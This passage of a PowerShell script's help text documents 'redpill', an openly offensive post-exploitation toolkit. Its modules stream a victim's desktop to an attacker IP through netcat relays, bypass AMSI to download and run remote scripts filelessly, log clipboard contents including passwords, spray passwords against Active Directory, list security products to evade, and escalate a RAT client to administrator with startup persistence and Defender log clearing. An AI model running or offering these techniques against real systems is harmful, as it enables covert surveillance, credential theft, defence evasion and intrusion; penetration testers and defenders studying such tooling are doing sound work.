      Author: @kfosaaen | @r00t-3xp10it
      Helper - Enumerating and attacking federated Skype

   .DESCRIPTION
      Enumerating and attacking Skype for Business instances.

   .NOTES
      Mandatory requirements: Microsoft.Lync.Model 2013 SDK
      http://www.microsoft.com/en-us/download/details.aspx?id=36824
      Remark: You need to have Skype open and signed in first!

   .Parameter GetSkype
      Accepts arguments: Contacts, DomainUsers (default: Contacts)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetSkype Contacts

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetSkype DomainUsers

   .OUTPUTS
      Email             Title              Full Name     Status    Out Of Office  Endpoints
      -----             -----              ---------     ------    -------------  ---------
      test@example.com  Person of Interest J Doe         Offline   False          Work: tel:911
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "LiveStream"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @samratashok (nishang) | @r00t-3xp10it
      Helper - cmdlet for streaming a target's desktop using MJPEG.

   .DESCRIPTION
      This script uses MJPEG to stream a target's desktop in real time.
      A browser which supports MJPEG (eg Firefox) should then be pointed
      to the local port sellected by attacker to stream the remote desktop.

   .NOTES
      Mandatory dependencies: A browser which supports MJPEG (Default: Firefox)
      If attacker sellect a -Timmer '0' then stream will stay open until attacker
      manualy stops it using this cmdlet -LiveStream 'Stop' argument, If another
      Timmer its sellected then this cmdlet will wait -Timmer 'seconds' to stop
      the streaming and delete ALL artifacts left behind by this function.

   .Parameter LiveStream
      Accepts arguments: Bind, Reverse, Stop (default: Bind)

   .Parameter IPAddress
      The attacker IP address to connect to when using -Reverse switch.

   .Parameter Port
      The port number to connect to when using the -Reverse switch.
      When using -Bind it is the port on which this script listens.

   .Parameter Timmer
      The amount of time in seconds to keep streaming (default: 18)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 4321 -Timmer 25
      Start target desktop live streamimg on port 4321 tcp for 25 seconds time!
      Access live stream on attacker firefox webbrowser: http://<target_ip>:4321

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 1234 -Timmer 0
      Start target desktop live streamimg on port 1234 (keep streaming indefinitely)
      Remark: If -Timmer '0' its sellected, then streaming must be manualy stoped!

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -LiveStream Reverse -IpAddress 192.168.1.73 -Port 4444
      Remark: Then execute this netcat cmdline on attacker side: [ nc -nlvp 4444 | nc -nlvp 9000 ]
      Access live stream on attacker firefox webbrowser: http://192.168.1.73:9000 (attacker ip:port)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -LiveStream Stop
      Remote stop target desktop live streamimg process

   .OUTPUTS
      Stream desktop settings
      --------------------------
      Target      : 192.168.1.72
      Attacker    : 192.168.1.73
      Stream      : Reverse
      ReversePort : 4444
      Timmer      : 30 (sec)

      Creating trigger.ps1 to import \ run module on a diferent process! (child)
      Executing Start-Process to run module in a new powershell process! (child)
      -----------------------------------------------------------------------------
      Execute on attacker console : nc -nlvp 4444 | nc -nlvp 9000
      Start firefox on attacker pc: http://192.168.1.73:9000 to access stream!
      -----------------------------------------------------------------------------
      Streaming remote target desktop for: 30 seconds!
      Stoping process Id: 49392 (LiveStream)
      Deleting ALL artifacts left behind!

   .LINK
      https://www.labofapenetrationtester.com/2015/12/stream-targets-desktop-using-mjpeg-and-powershell.html
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetCounterMeasures"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - List common security processes running!

   .DESCRIPTION
      This cmdlet enumerates common security product processes running
      on target system, By exec 'Get-Process' powershell cmdlet {native}
      to retrieve process 'product name', 'process name' and 'process pid'

   .NOTES
      Currentlly this cmdlet query for the most common AV processes,
      AppWhitelisting, Behavioral Analysis, Intrusion Detection, DLP.

   .Parameter Action
      Accepts arguments: Enum, Verbose (default: Enum)

   .EXAMPLE
      PS C:\> powershell -file redpill.ps1 -GetCounterMeasures Enum
      List common security product processes\pid's running on target!

   .EXAMPLE
      PS C:\> powershell -file redpill.ps1 -GetCounterMeasures Verbose
      List common security product processes names\pid's, AppWhitelisting,
      Behavioral Analysis, EDR, DLP, Intrusion Detection, Firewall, HIPS.

   .OUTPUTS
      Pid  ProcessName Product             Description        
      ---  ----------- -------             -----------        
      3512 MsMpEng     Anti-Virus          Windows Defender AV
      4300 TmPfw       Firewall            Trend Micro firewall
      8945 CSFalcon    Behavioral Analysis CrowdStrike Falcon EDR
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "NoAmsi"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Test AMS1 string bypasses or simple execute one bypass!
   
   .DESCRIPTION
      This cmdlet tests an internal list of amsi_bypass_technics on
      current shell or simple executes one of the bypass technics.
      This cmdlet re-uses: @_RastaMouse, @Mattifestation and @nullbyte
      source code POC's obfuscated {by me} to evade runtime detection.
   
   .NOTES
      _Remark: The Amsi_bypasses will only work on current shell while is
      process is running. But on process close all will return to default.
      _Remark: If sellected -Action '<testall>' then this cmdlet will try
      all available bypasses and aborts at the first successfull bypass.
      _Remark: -PayloadURL '<url>' only works with -Action 'bypass' @arg.
      _Remark: -PayloadURL '<url>' does not use technic nº1 (PS_DOWNGRADE) 

   .Parameter NoAmsi
      Accepts arguments: list, testall, bypass (default: bypass)

   .Parameter Id
      The technic Id to use for am`si_bypass (default: 2)  

   .Parameter PayloadURL
      The URL script.ps1 to be downloaded\executed! (default: false)

   .Parameter PSargs
      The cmdlet to be downloaded\exec argument list (default: false)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -NoAmsi List
      List ALL cmdlet Am`si_bypasses available!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -NoAmsi TestAll
      Test ALL cmdlet Am`si_bypasses technics!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -NoAmsi Bypass -Id 5
      Execute Am`si_bypass technic nº5 on current shell!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -NoAmsi bypass -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetSkype.ps1"
      Download\Execute 'GetSkype.ps1' (FileLess) trougth Ams1_bypass technic nº2 (cmdlet default technic)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -NoAmsi bypass -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -PSargs "-sysinfo enum"
      Download\Execute 'sysinfo.ps1' with arguments (FileLess) trougth Ams1_bypass technic nº2 (cmdlet default technic)

   .OUTPUTS
      Testing am`si_bypass technics
      ----------------------------
      Id          : 1
      bypass      : failed
      Disclosure  : @nullbyte
      Description : PS_DOWNG`RADE_ATT`ACK
      POC         : powershell -version 2 -C Get-Host
      Remark      : powershell version 2 not found in SKYNET!

      Id          : 2
      bypass      : success
      Disclosure  : @mattifestation
      Description : DL`L_REFLEC`TION
      POC         : ----
      Remark      : string detection disabled!
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "Clipboard"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture clipboard text\file\image\audio contents!

   .DESCRIPTION
      This module captures clipboard content everytime the clipboard its used!
      The clipboard is a section of RAM where your computer stores copied data.
      This can be a selection of text, an image, a file, or other type of data
      it is placed in the clipboard whenever you use the "Copy" (CTRL+C) command.  

   .NOTES
      If sellected the parameter -Action '<Capture>' then this cmdlet start
      capture clipboard for a specified amount of time defined by -CaptureTime
      If sellected -Forensic '<True>' then this cmdlet will store files, images,
      audio files beeing passed to clipboard into '`$Env:TMP\Forensic' directory.
      If -captureTime is bigger than 60 sec then cmdlet will run in stealth mode.
   
   .Parameter Action
      Accepts arguments: Enum, Capture, Prank (default: Enum)

   .Parameter Database
      [Capture] The path where to store captures (default: `$Env:TMP\clipboard.log)

   .Parameter CaptureTime
      [Capture] The amount of time in seconds to capture clipboard (default: 30)

   .Parameter GetStrings
      [Capture] The interval in seconds for query clipboard contents (default: 2)
   
   .Parameter Forensic
      [Capture] Store the documents beeing passed to the clipboard? (default: false)
   
   .Parameter SetText
      [Prank] The text data to overwrite the clipboard with (default: Eureka)

   .Parameter SetPath
      [Prank] The path to overwrite the clipboard with (default: `$Env:WINDIR\System32\calc.exe)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -Clipboard Enum
      Capture current clipboard text\file\image\audio!

   .EXAMPLE
      PS C:\> .\redpill.ps1 -Clipboard Capture -CaptureTime "10" -Database "`$Env:TMP\clip.log"
      Capture clipboard contents for 10 seconds total time into -Database '<string>' directory!
   
   .EXAMPLE
      PS C:\> .\redpill.ps1 -Clipboard Capture -CaptureTime "30" -Forensic True
      Capture clipboard contents for 30 sec and Store files beeing passed to clipboard!
      Remark: This function creates 'Forensic' folder under %TMP% directory for storage!
   
   .EXAMPLE
      PS C:\> .\redpill.ps1 -Clipboard Prank -CaptureTime "15" -SetText "HACKED" -SetPath "`$Env:TMP"
      Overwrite clipboard data for 15 seconds by -SetText '<string>' and -SetPath '<string>' values!
      Remark: This function set's the clipboard to our data every 2 sec until -CaptureTime its reached!

   .OUTPUTS
      * Capture SKYNET clipboard for 30 seconds time!
        => logfile 'C:\Users\pedro\AppData\Local\Temp\clipboard.log'

      [07:54:26] whoami
      [07:54:28] myS3cr3tpAss
      [07:54:30] netstat -ano|findstr "ESTABLISHED"
      [07:54:32] C:\Users\pedro\music\ironmaiden\eddie.mp4
      [07:54:34] C:\Users\pedro\images\praiadasamoqueira.jpg
      [07:54:36] C:\Users\pedro\Coding\redpill\bin\NoAmsi.ps1
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "PasswordSpray"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @JakobHeidelberg & @CyberKeel
      Helper - Password spraying attack against accounts in Active Directory!

   .DESCRIPTION
       PoC PowerShell script to demo how to perform password spraying attacks against 
       user accounts in Active Directory (AD), aka low and slow online brute force method.
    
       Should NOT be considered OPSEC safe since:
       - a lot of traffic is generated between the host and the Domain Controller(s).
       - failed logon events will be massive on Domain Controller(s).
       - badpwdcount will iterate on user account objects in scope.

   .NOTES
       Does not require admin access, neither in AD or on Windows host.
       No accounts should be locked out by this script alone, but there are no guarantees.
       NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.

   .Parameter PasswordSpray
      Accepts arguments: Spray (default: Spray)

   .Parameter Password
      Input single or multiple passwords to test (default: false)

   .Parameter FilePath
      The path to the password input file to use (default: false)

   .Parameter Url
      Download file from given URL and use as password input file (default: false)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -PasswordSpray Spray -Password "admin123,s3cr3t"
      Specify a single or multiple passwords to test for each targeted user account.
      Eg. -Pass 'Password1,Password2'. Do not use together with -FilePath or -Url.

   .EXAMPLE
      PS C:\> .\redpill.ps1 -PasswordSpray Spray -FilePath "`$Env:TMP\dicionary.txt"
      Supply a path to a password input file to test multiple passwords for each
      targeted user account. Do not use together with -Password or -Url.

   .EXAMPLE
      PS C:\> .\redpill.ps1 -PasswordSpray Spray -Url "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/rockme.txt"
      Download the password file with weak passwords and test each password against all active user accounts (except privileged)

   .OUTPUTS
      [START]: Password spraying attack!
      VERBOSE: Lockout duration is: 30 attempts.
      VERBOSE: Threshold is probably 'Never', setting max to 1000 ..
      Guessed password for user: 'Pedro' = 'mys3cr3tpass'
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetAdmin"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Elevate sessions from UserLand to Administrator!

   .DESCRIPTION
      Often in penetration tests our payload tends to be executed without administrator
      privileges by target user. This cmdlet allows attackers to elevate our payload(s)
      from 'UserLand' to 'Administrator' privileges by asking the attacker to input payload
      absolucte path and creating an PS1 script in %tmp% that silently executes EOP technic.

   .NOTES
      Workflow: The attacker needs to run the GetAdmin cmdlet to create the PS1 script that
      silently executes our payload at predefined time intervals (DelayTime), then needs to
      exit the current shell and start a new handler to wait for the new elevated connection.

      Remark: Avoid set directorys with empty spaces in -FilePath '<string>' argument declarations.
      Remark: The -filepath '<Payload>' parameter only executes payloads: '<ps1, bat, vbs, py, exe>'.
      Remark: The -delaytime '<int>' parameter sets the timer for the loop between payload executions.
      Remark: The -action '<check>' param clears Powershell\Defender logs if it manages to escalate privs. 

   .Parameter GetAdmin
      Accepts arguments: check, exec (default: check)

   .Parameter FilePath
      The payload to execute absolucte path (default: false)

   .Parameter Try
      The amount of payload executions to try (default: 1)

   .Parameter DelayTime
      The time in seconds to delay payload exec (default: 30)

   .Parameter Persiste
      Persiste payload EOP execution on startup? (default: false)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetAdmin Check
      Can we escalate privileges? (testing)

   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetAdmin Exec -Try "3" -DelayTime "13" -FilePath "`$Env:TMP\revTCPclient.ps1"
      Execute rat client (revTCPclient.ps1) 3 times max, with 13 seconds of delay between each execution.
   
   .EXAMPLE
      PS C:\> .\redpill.ps1 -GetAdmin Exec -Try "120" -DelayTime "60" -FilePath "`$Env:TMP\revTCPclient.ps1" -Persiste True
      [startup] Execute rat client (revTCPclient.ps1) 120 times max, with 60 seconds of delay between each EOP execution.

   .OUTPUTS
      * Elevate session from UserLand to Admin! (EOP)

      Try  DelayTime  Persiste  FilePath
      ---  ---------  --------  --------
      2    30(sec)    False     C:\Users\pedro\AppData\Local\Temp\revTCPclient.ps1

      * Exit your rat shell, start a new handler to recive the elevated connection.
        => Remenber: To manual delete artifacts from 'TMP' folder after escalation.
   #>!bye..

"@;
Write-Host "$HelpParameters"
}